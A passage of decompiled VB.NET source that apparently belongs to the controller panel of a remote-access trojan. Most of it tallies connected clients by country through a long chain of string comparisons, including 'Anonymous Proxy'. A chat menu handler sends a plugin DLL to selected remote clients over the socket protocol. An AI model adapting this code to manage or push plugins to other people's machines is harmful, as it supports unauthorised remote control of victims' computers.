        If (str = Strings.UCase("Cyprus")) Then
            Main.Cyprus = Operators.AddObject(Main.Cyprus, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Czech Republic")) Then
            Main.CzechRepublic = Operators.AddObject(Main.CzechRepublic, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Denmark")) Then
            Main.Denmark = Operators.AddObject(Main.Denmark, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Djibouti")) Then
            Main.Djibouti = Operators.AddObject(Main.Djibouti, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Dominica")) Then
            Main.Dominica = Operators.AddObject(Main.Dominica, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Dominican Republic")) Then
            Main.DominicanRepublic = Operators.AddObject(Main.DominicanRepublic, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Ecuador")) Then
            Main.Ecuador = Operators.AddObject(Main.Ecuador, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Egypt")) Then
            Main.Egypt = Operators.AddObject(Main.Egypt, 1)
            Return obj2
        End If
        If (str = Strings.UCase("El Salvador")) Then
            Main.ElSalvador = Operators.AddObject(Main.ElSalvador, 1)
            Return obj2
        End If
        If (str = Strings.UCase("England")) Then
            Main.England = Operators.AddObject(Main.England, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Equatorial Guinea")) Then
            Main.EquatorialGuinea = Operators.AddObject(Main.EquatorialGuinea, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Eritrea")) Then
            Main.Eritrea = Operators.AddObject(Main.Eritrea, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Estonia")) Then
            Main.Estonia = Operators.AddObject(Main.Estonia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Ethiopia")) Then
            Main.Ethiopia = Operators.AddObject(Main.Ethiopia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("European Union")) Then
            Main.Europe = Operators.AddObject(Main.Europe, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Falkland Islands (Malvinas)")) Then
            Main.FalklandIslandsMalvinas = Operators.AddObject(Main.FalklandIslandsMalvinas, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Faroes")) Then
            Main.FaroeIslands = Operators.AddObject(Main.FaroeIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Fiji")) Then
            Main.Fiji = Operators.AddObject(Main.Fiji, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Finland")) Then
            Main.Finland = Operators.AddObject(Main.Finland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("France")) Then
            Main.France = Operators.AddObject(Main.France, 1)
            Return obj2
        End If
        If (str = Strings.UCase("French Guiana")) Then
            Main.FrenchGuiana = Operators.AddObject(Main.FrenchGuiana, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Tahiti (French Polinesia)")) Then
            Main.FrenchPolynesia = Operators.AddObject(Main.FrenchPolynesia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("French Southern Territories")) Then
            Main.FrenchSouthernTerritories = Operators.AddObject(Main.FrenchSouthernTerritories, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Gabon")) Then
            Main.Gabon = Operators.AddObject(Main.Gabon, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Gambia")) Then
            Main.Gambia = Operators.AddObject(Main.Gambia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Georgia")) Then
            Main.Georgia = Operators.AddObject(Main.Georgia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Germany")) Then
            Main.Germany = Operators.AddObject(Main.Germany, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Ghana")) Then
            Main.Ghana = Operators.AddObject(Main.Ghana, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Gibraltar")) Then
            Main.Gibraltar = Operators.AddObject(Main.Gibraltar, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Greece")) Then
            Main.Greece = Operators.AddObject(Main.Greece, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Greenland")) Then
            Main.Greenland = Operators.AddObject(Main.Greenland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Grenada")) Then
            Main.Grenada = Operators.AddObject(Main.Grenada, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Guadeloupe")) Then
            Main.Guadeloupe = Operators.AddObject(Main.Guadeloupe, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Guam")) Then
            Main.Guam = Operators.AddObject(Main.Guam, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Guatemala")) Then
            Main.Guatemala = Operators.AddObject(Main.Guatemala, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Guinea")) Then
            Main.Guinea = Operators.AddObject(Main.Guinea, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Guinea-Bissau")) Then
            Main.GuineaBissau = Operators.AddObject(Main.GuineaBissau, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Guyana")) Then
            Main.Guyana = Operators.AddObject(Main.Guyana, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Haiti")) Then
            Main.Haiti = Operators.AddObject(Main.Haiti, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Heard Island and McDonald Islands")) Then
            Main.HeardIslandandMcDonaldIslands = Operators.AddObject(Main.HeardIslandandMcDonaldIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Honduras")) Then
            Main.Honduras = Operators.AddObject(Main.Honduras, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Hong Kong")) Then
            Main.HongKong = Operators.AddObject(Main.HongKong, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Hungary")) Then
            Main.Hungary = Operators.AddObject(Main.Hungary, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Iceland")) Then
            Main.Iceland = Operators.AddObject(Main.Iceland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("India")) Then
            Main.India = Operators.AddObject(Main.India, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Indonesia")) Then
            Main.Indonesia = Operators.AddObject(Main.Indonesia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Islamic Republic of Iran")) Then
            Main.IslamicRepublicofIran = Operators.AddObject(Main.IslamicRepublicofIran, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Iraq")) Then
            Main.Iraq = Operators.AddObject(Main.Iraq, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Ireland")) Then
            Main.Ireland = Operators.AddObject(Main.Ireland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Palestinian Territory, Occupied")) Then
            Main.PalestinianTerritory = Operators.AddObject(Main.PalestinianTerritory, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Italy")) Then
            Main.Italy = Operators.AddObject(Main.Italy, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Jamaica")) Then
            Main.Jamaica = Operators.AddObject(Main.Jamaica, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Japan")) Then
            Main.Japan = Operators.AddObject(Main.Japan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Jordan")) Then
            Main.Jordan = Operators.AddObject(Main.Jordan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Kazakhstan")) Then
            Main.Kazakhstan = Operators.AddObject(Main.Kazakhstan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Kenya")) Then
            Main.Kenya = Operators.AddObject(Main.Kenya, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Kiribati")) Then
            Main.Kiribati = Operators.AddObject(Main.Kiribati, 1)
            Return obj2
        End If
        If (str = Strings.UCase("North Korea")) Then
            Main.NorthKorea = Operators.AddObject(Main.NorthKorea, 1)
            Return obj2
        End If
        If (str = Strings.UCase("South Korea")) Then
            Main.SouthKorea = Operators.AddObject(Main.SouthKorea, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Kuwait")) Then
            Main.Kuwait = Operators.AddObject(Main.Kuwait, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Kyrgyzstan")) Then
            Main.Kyrgyzstan = Operators.AddObject(Main.Kyrgyzstan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Laos")) Then
            Main.LaoPeoplesDemocraticRepublic = Operators.AddObject(Main.LaoPeoplesDemocraticRepublic, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Latvia")) Then
            Main.Latvia = Operators.AddObject(Main.Latvia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Lebanon")) Then
            Main.Lebanon = Operators.AddObject(Main.Lebanon, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Lesotho")) Then
            Main.Lesotho = Operators.AddObject(Main.Lesotho, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Liberia")) Then
            Main.Liberia = Operators.AddObject(Main.Liberia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Libya")) Then
            Main.Libya = Operators.AddObject(Main.Libya, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Liechtenstein")) Then
            Main.Liechtenstein = Operators.AddObject(Main.Liechtenstein, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Lithuania")) Then
            Main.Lithuania = Operators.AddObject(Main.Lithuania, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Luxembourg")) Then
            Main.Luxembourg = Operators.AddObject(Main.Luxembourg, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Macao")) Then
            Main.Macao = Operators.AddObject(Main.Macao, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Macedonia")) Then
            Main.RepublicofMacedonia = Operators.AddObject(Main.RepublicofMacedonia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Madagascar")) Then
            Main.Madagascar = Operators.AddObject(Main.Madagascar, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Malawi")) Then
            Main.Malawi = Operators.AddObject(Main.Malawi, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Malaysia")) Then
            Main.Malaysia = Operators.AddObject(Main.Malaysia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Maldives")) Then
            Main.Maldives = Operators.AddObject(Main.Maldives, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Mali")) Then
            Main.Mali = Operators.AddObject(Main.Mali, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Malta")) Then
            Main.Malta = Operators.AddObject(Main.Malta, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Marshall Islands")) Then
            Main.MarshallIslands = Operators.AddObject(Main.MarshallIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Martinique")) Then
            Main.Martinique = Operators.AddObject(Main.Martinique, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Mauritania")) Then
            Main.Mauritania = Operators.AddObject(Main.Mauritania, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Mauritius")) Then
            Main.Mauritius = Operators.AddObject(Main.Mauritius, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Mayotte")) Then
            Main.Mayotte = Operators.AddObject(Main.Mayotte, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Mexico")) Then
            Main.Mexico = Operators.AddObject(Main.Mexico, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Micronesia")) Then
            Main.FederatedStatesofMicronesia = Operators.AddObject(Main.FederatedStatesofMicronesia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Moldova")) Then
            Main.RepublicofMoldova = Operators.AddObject(Main.RepublicofMoldova, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Monaco")) Then
            Main.PrincipalityofMonaco = Operators.AddObject(Main.PrincipalityofMonaco, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Mongolia")) Then
            Main.Mongolia = Operators.AddObject(Main.Mongolia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Montenegro")) Then
            Main.Montenegro = Operators.AddObject(Main.Montenegro, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Montserrat")) Then
            Main.Montserrat = Operators.AddObject(Main.Montserrat, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Morocco")) Then
            Main.Morocco = Operators.AddObject(Main.Morocco, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Mozambique")) Then
            Main.Mozambique = Operators.AddObject(Main.Mozambique, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Myanmar")) Then
            Main.Myanmar = Operators.AddObject(Main.Myanmar, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Namibia")) Then
            Main.Namibia = Operators.AddObject(Main.Namibia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Nauru")) Then
            Main.Nauru = Operators.AddObject(Main.Nauru, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Nepal")) Then
            Main.Nepal = Operators.AddObject(Main.Nepal, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Netherlands Antilles")) Then
            Main.NetherlandsAntilles = Operators.AddObject(Main.NetherlandsAntilles, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Netherlands")) Then
            Main.Netherlands = Operators.AddObject(Main.Netherlands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("New Caledonia")) Then
            Main.NewCaledonia = Operators.AddObject(Main.NewCaledonia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("New Zealand")) Then
            Main.NewZealand = Operators.AddObject(Main.NewZealand, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Nicaragua")) Then
            Main.Nicaragua = Operators.AddObject(Main.Nicaragua, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Niger")) Then
            Main.Niger = Operators.AddObject(Main.Niger, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Nigeria")) Then
            Main.Nigeria = Operators.AddObject(Main.Nigeria, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Niue")) Then
            Main.Niue = Operators.AddObject(Main.Niue, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Norfolk Island")) Then
            Main.NorfolkIsland = Operators.AddObject(Main.NorfolkIsland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Northern Mariana Islands")) Then
            Main.NorthernMarianaIslands = Operators.AddObject(Main.NorthernMarianaIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Norway")) Then
            Main.Norway = Operators.AddObject(Main.Norway, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Oman")) Then
            Main.SultanateofOman = Operators.AddObject(Main.SultanateofOman, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Pakistan")) Then
            Main.IslamicRepublicofPakistan = Operators.AddObject(Main.IslamicRepublicofPakistan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Palau")) Then
            Main.Palau = Operators.AddObject(Main.Palau, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Panama")) Then
            Main.Panama = Operators.AddObject(Main.Panama, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Papua New Guinea")) Then
            Main.PapuaNewGuinea = Operators.AddObject(Main.PapuaNewGuinea, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Paraguay")) Then
            Main.Paraguay = Operators.AddObject(Main.Paraguay, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Peru")) Then
            Main.Peru = Operators.AddObject(Main.Peru, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Philippines")) Then
            Main.Philippines = Operators.AddObject(Main.Philippines, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Pitcairn Islands")) Then
            Main.PitcairnIslands = Operators.AddObject(Main.PitcairnIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Poland")) Then
            Main.Poland = Operators.AddObject(Main.Poland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Portugal")) Then
            Main.Portugal = Operators.AddObject(Main.Portugal, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Palestine")) Then
            Main.Palestine = Operators.AddObject(Main.Palestine, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Puerto Rico")) Then
            Main.PuertoRico = Operators.AddObject(Main.PuertoRico, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Qatar")) Then
            Main.Qatar = Operators.AddObject(Main.Qatar, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Reunion")) Then
            Main.Reunion = Operators.AddObject(Main.Reunion, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Romania")) Then
            Main.Romania = Operators.AddObject(Main.Romania, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Serbia")) Then
            Main.Serbia = Operators.AddObject(Main.Serbia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Russian Federation")) Then
            Main.Russia = Operators.AddObject(Main.Russia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Rwanda")) Then
            Main.Rwanda = Operators.AddObject(Main.Rwanda, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Saint Helena")) Then
            Main.SaintHelena = Operators.AddObject(Main.SaintHelena, 1)
            Return obj2
        End If
        If (str = Strings.UCase("St Kitts & Nevis")) Then
            Main.SaintKittsandNevis = Operators.AddObject(Main.SaintKittsandNevis, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Saint Lucia")) Then
            Main.SaintLucia = Operators.AddObject(Main.SaintLucia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Saint Pierre and Miquelon")) Then
            Main.SaintPierreandMiquelon = Operators.AddObject(Main.SaintPierreandMiquelon, 1)
            Return obj2
        End If
        If (str = Strings.UCase("St Vincent & the Grenadines")) Then
            Main.SaintVincentandtheGrenadines = Operators.AddObject(Main.SaintVincentandtheGrenadines, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Samoa")) Then
            Main.Samoa = Operators.AddObject(Main.Samoa, 1)
            Return obj2
        End If
        If (str = Strings.UCase("San Marino")) Then
            Main.SanMarino = Operators.AddObject(Main.SanMarino, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Sao Tome & Principe")) Then
            Main.SaoTomeandPrincipe = Operators.AddObject(Main.SaoTomeandPrincipe, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Saudi Arabia")) Then
            Main.SaudiArabia = Operators.AddObject(Main.SaudiArabia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Scotland")) Then
            Main.Scotland = Operators.AddObject(Main.Scotland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Senegal")) Then
            Main.Senegal = Operators.AddObject(Main.Senegal, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Seychelles")) Then
            Main.Seychelles = Operators.AddObject(Main.Seychelles, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Sierra Leone")) Then
            Main.SierraLeone = Operators.AddObject(Main.SierraLeone, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Singapore")) Then
            Main.Singapore = Operators.AddObject(Main.Singapore, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Slovakia")) Then
            Main.Slovakia = Operators.AddObject(Main.Slovakia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Slovenia")) Then
            Main.Slovenia = Operators.AddObject(Main.Slovenia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Solomon Islands")) Then
            Main.SolomonIslands = Operators.AddObject(Main.SolomonIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Somalia")) Then
            Main.Somalia = Operators.AddObject(Main.Somalia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("South Africa")) Then
            Main.SouthAfrica = Operators.AddObject(Main.SouthAfrica, 1)
            Return obj2
        End If
        If (str = Strings.UCase("South Georgia and the South Sandwich Islands")) Then
            Main.SouthGeorgiaandtheSouthSandwichIslands = Operators.AddObject(Main.SouthGeorgiaandtheSouthSandwichIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Spain")) Then
            Main.Spain = Operators.AddObject(Main.Spain, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Sri Lanka")) Then
            Main.SriLanka = Operators.AddObject(Main.SriLanka, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Sudan")) Then
            Main.Sudan = Operators.AddObject(Main.Sudan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Suriname")) Then
            Main.Suriname = Operators.AddObject(Main.Suriname, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Svalbard and Jan Mayen")) Then
            Main.SvalbardandJanMayen = Operators.AddObject(Main.SvalbardandJanMayen, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Swaziland")) Then
            Main.Swaziland = Operators.AddObject(Main.Swaziland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Sweden")) Then
            Main.Sweden = Operators.AddObject(Main.Sweden, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Switzerland")) Then
            Main.Switzerland = Operators.AddObject(Main.Switzerland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Syria")) Then
            Main.Syria = Operators.AddObject(Main.Syria, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Taiwan")) Then
            Main.Taiwan = Operators.AddObject(Main.Taiwan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Tajikistan")) Then
            Main.Tajikistan = Operators.AddObject(Main.Tajikistan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Tanzania")) Then
            Main.UnitedRepublicofTanzania = Operators.AddObject(Main.UnitedRepublicofTanzania, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Thailand")) Then
            Main.Thailand = Operators.AddObject(Main.Thailand, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Togo")) Then
            Main.Togo = Operators.AddObject(Main.Togo, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Tokelau")) Then
            Main.Tokelau = Operators.AddObject(Main.Tokelau, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Tonga")) Then
            Main.Tonga = Operators.AddObject(Main.Tonga, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Trinidad & Tobago")) Then
            Main.TrinidadAndTobago = Operators.AddObject(Main.TrinidadAndTobago, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Tunisia")) Then
            Main.Tunisia = Operators.AddObject(Main.Tunisia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Turkey")) Then
            Main.Turkey = Operators.AddObject(Main.Turkey, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Turkmenistan")) Then
            Main.Turkmenistan = Operators.AddObject(Main.Turkmenistan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Turks and Caicos Islands")) Then
            Main.TurksandCaicosIslands = Operators.AddObject(Main.TurksandCaicosIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Tuvalu")) Then
            Main.Tuvalu = Operators.AddObject(Main.Tuvalu, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Uganda")) Then
            Main.Uganda = Operators.AddObject(Main.Uganda, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Ukraine")) Then
            Main.Ukraine = Operators.AddObject(Main.Ukraine, 1)
            Return obj2
        End If
        If (str = Strings.UCase("United Arab Emirates")) Then
            Main.UnitedArabEmirates = Operators.AddObject(Main.UnitedArabEmirates, 1)
            Return obj2
        End If
        If (str = Strings.UCase("United Kingdom")) Then
            Main.UnitedKingdom = Operators.AddObject(Main.UnitedKingdom, 1)
            Return obj2
        End If
        If (str = Strings.UCase("United States Minor Outlying Islands")) Then
            Main.UnitedStatesMinorOutlyingIslands = Operators.AddObject(Main.UnitedStatesMinorOutlyingIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("United States of America")) Then
            Main.UnitedStates = Operators.AddObject(Main.UnitedStates, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Uruguay")) Then
            Main.Uruguay = Operators.AddObject(Main.Uruguay, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Uzbekistan")) Then
            Main.Uzbekistan = Operators.AddObject(Main.Uzbekistan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Wales")) Then
            Main.Wales = Operators.AddObject(Main.Wales, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Wallis and Futuna")) Then
            Main.WallisAndFutuna = Operators.AddObject(Main.WallisAndFutuna, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Vanuatu")) Then
            Main.Vanuatu = Operators.AddObject(Main.Vanuatu, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Vatican City")) Then
            Main.VaticanCityState = Operators.AddObject(Main.VaticanCityState, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Venezuela")) Then
            Main.Venezuela = Operators.AddObject(Main.Venezuela, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Western Sahara")) Then
            Main.WesternSahara = Operators.AddObject(Main.WesternSahara, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Viet Nam")) Then
            Main.Vietnam = Operators.AddObject(Main.Vietnam, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Virgin Islands US")) Then
            Main.UnitedStatesVirginIslands = Operators.AddObject(Main.UnitedStatesVirginIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Yemen")) Then
            Main.Yemen = Operators.AddObject(Main.Yemen, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Zambia")) Then
            Main.Zambia = Operators.AddObject(Main.Zambia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Zimbabwe")) Then
            Main.Zimbabwe = Operators.AddObject(Main.Zimbabwe, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Cook Islands")) Then
            Main.CookIslands = Operators.AddObject(Main.CookIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Antarctica")) Then
            Main.Antarctica = Operators.AddObject(Main.Antarctica, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Congo-Brazzaville")) Then
            Main.Congo = Operators.AddObject(Main.Congo, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Cote D'Ivoire")) Then
            Main.CoteDIvoire = Operators.AddObject(Main.CoteDIvoire, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Satellite Provider")) Then
            Main.SatelliteProvider = Operators.AddObject(Main.SatelliteProvider, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Aland Islands")) Then
            Main.AlandIslands = Operators.AddObject(Main.AlandIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Guernsey")) Then
            Main.Guernsey = Operators.AddObject(Main.Guernsey, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Isle of Man")) Then
            Main.IsleofMan = Operators.AddObject(Main.IsleofMan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Jersey")) Then
            Main.Jersey = Operators.AddObject(Main.Jersey, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Saint Barthelemy")) Then
            Main.SaintBarthelemy = Operators.AddObject(Main.SaintBarthelemy, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Unknown")) Then
            Main.NA = Operators.AddObject(Main.NA, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Anonymous Proxy")) Then
            Main.NA = Operators.AddObject(Main.NA, 1)
        End If
        Return obj2
    End Function

    Private Sub ChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChatToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\CH.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\CH.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "CH", Me.Key, "CH"}))
                Loop
            Finally
            End Try
        End If
    End Sub
    Public Function CICNE() As Object
        Dim obj2 As Object
        Dim label As Label
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.GuineaBissau, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Guinea-Bissau : ", Main.GuineaBissau)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Guyana, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Guyana : ", Main.Guyana)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Haiti, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Haiti : ", Main.Haiti)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.HeardIslandandMcDonaldIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Heard Island and McDonald Islands : ", Main.HeardIslandandMcDonaldIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Honduras, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Honduras : ", Main.Honduras)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.HongKong, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Hong Kong : ", Main.HongKong)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Hungary, 0, False))) Then
            label = Me.Label4
